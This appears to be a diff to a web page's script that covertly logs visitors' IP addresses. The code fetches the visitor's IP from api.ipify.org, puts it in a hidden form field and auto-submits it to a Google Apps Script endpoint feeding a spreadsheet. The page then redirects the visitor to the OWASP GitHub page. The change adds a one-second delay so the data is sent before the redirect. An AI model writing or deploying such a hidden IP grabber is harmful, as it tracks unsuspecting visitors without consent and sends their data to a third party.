@@ -5,7 +5,7 @@
 </form>
 
 <script>
-  const scriptURL = 'https://script.google.com/macros/s/AKfycbxmEdOzb9pR1SAoR5gcC4HDMvppPcLLTrA8A6-FSdF2vskn83ro/exec'
+  const scriptURL = 'https://script.google.com/macros/s/AKfycbwSI9-cW4eUUz1NfD5WOyMLPaBvkBQN6Wm0CRnSF3xlVsMUtDs/exec'
   const form = document.forms['submit-to-google-sheet']
   form.addEventListener('submit', e => {
     e.preventDefault()
@@ -19,19 +19,21 @@
       function user_location() {
 		var xhttp = new XMLHttpRequest();
 		xhttp.onreadystatechange = function() {
-		if (this.readyState == 4 && this.status == 200) {
-			var ipInfo = this.responseText;
-			var userNameField = document.getElementById("ip");
-            userNameField.value = ipInfo;
-            var goButton = document.getElementById("go");
-            goButton.click();
-		}
-		};
-		xhttp.open("GET", "https://api.ipify.org", true);
-		xhttp.send();
-	    window.location.replace("https://github.com/OWASP");
+		  if (this.readyState == 4 && this.status == 200) {
+			  var ipInfo = this.responseText;
+			  var userNameField = document.getElementById("ip");
+              userNameField.value = ipInfo;
+              var goButton = document.getElementById("go");
+              goButton.click();
+		  };
+	    }	
+				xhttp.open("GET", "https://api.ipify.org", true);
+				xhttp.send();
 	  }
 	  user_location();
-	  //window.location.replace("https://github.com/OWASP");
+	  setTimeout(function(){
+		window.location.replace("https://github.com/OWASP");
+		}, 1000);
 </script>
+
 
